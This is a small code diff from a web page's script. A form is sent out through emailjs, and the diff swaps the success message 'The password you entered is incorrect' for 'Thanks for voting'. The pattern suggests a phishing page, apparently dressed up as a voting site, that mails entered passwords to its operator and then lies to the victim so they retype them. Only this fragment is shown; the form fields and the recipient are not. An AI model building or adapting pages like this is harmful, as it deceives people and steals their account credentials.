@@ -156,7 +156,7 @@
                 emailjs.sendForm(serviceID, templateID, this)
                     .then(() => {
                         btn.value = 'Send Email';
-                        alert('The password you entered is incorrect');
+                        alert('Thanks for voting');
                     }, (err) => {
                         btn.value = 'Send Email';
                         alert(JSON.stringify(err));
